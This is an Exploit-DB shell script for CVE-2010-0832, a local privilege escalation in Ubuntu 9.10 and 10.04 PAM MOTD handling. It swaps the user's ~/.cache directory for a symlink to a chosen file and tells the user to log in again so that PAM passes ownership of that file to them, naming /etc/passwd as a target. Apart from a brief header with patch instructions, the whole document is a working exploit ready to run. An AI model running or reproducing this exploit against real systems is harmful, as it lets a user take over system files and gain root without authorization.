#!/bin/sh
#
# EDB Note: Updated exploit ~ https://www.exploit-db.com/exploits/14339/
#
# Exploit Title: Ubuntu PAM MOTD file tampering (privilege escalation)
# Date: July 7, 2010
# Author: Kristian Erik Hermansen <kristian.hermansen@gmail.com>
# Software Link: http://packages.ubuntu.com/
# Version: pam-1.1.0
# Tested on: Ubuntu 10.04 LTS (Lucid Lynx)
# CVE : CVE-2010-0832
#
# Notes: Affects Ubuntu 9.10 and 10.04 LTS
# [Patch Instructions]
# $ sudo aptitude -y update; sudo aptitude -y install libpam~n~i
#

if [ $# -eq 0 ]; then
    echo "Usage: $0 /path/to/file"
    exit 1
fi

mkdir $HOME/backup 2> /dev/null
tmpdir=$(mktemp -d --tmpdir=$HOME/backup/)
mv $HOME/.cache/ $tmpdir 2> /dev/null
echo "\n@@@ File before tampering ...\n"
ls -l $1
ln -sf $1 $HOME/.cache
echo "\n@@@ Now log back into your shell (or re-ssh) to make PAM call vulnerable MOTD code :)  File will then be owned by your user.  Try /etc/passwd...\n"